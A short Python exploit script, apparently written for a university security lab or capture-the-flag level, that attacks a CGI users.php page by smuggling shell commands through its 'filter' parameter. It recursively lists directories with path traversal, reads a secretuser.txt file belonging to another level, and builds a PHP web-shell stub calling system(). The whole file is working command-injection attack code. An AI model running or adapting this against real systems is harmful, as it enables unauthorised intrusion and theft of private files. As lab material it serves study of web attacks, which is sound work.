import requests as r

path = "http://webexploit.cn.cse545.io:8082/cgi-bin/users.php?"
referer = "http://webexploit.cn.cse545.io:8082/users.html"
s = r.Session()
s.headers.update({"referer": referer})


def read_file(f):
    query = "filter=.%20" + f
    out = s.get(path + query)
    print(out.text)


def cmd_exec(command):
    query = "filter=;" + command
    out = s.get(path + query)
    print(out.text)


def create_php():
    command = ""
    command += "<?php\n"
    command += 'system("ls -l");\n'
    # command += 'echo $retval;\n'
    command += "?>"
    return command


# read_file('users.php')
cmd_exec("ls -laR ../../../")
# cmd_exec('ls -laR /tmp')
cmd_exec("cat ../../../level02/public_html/cgi-bin/secretuser.txt")
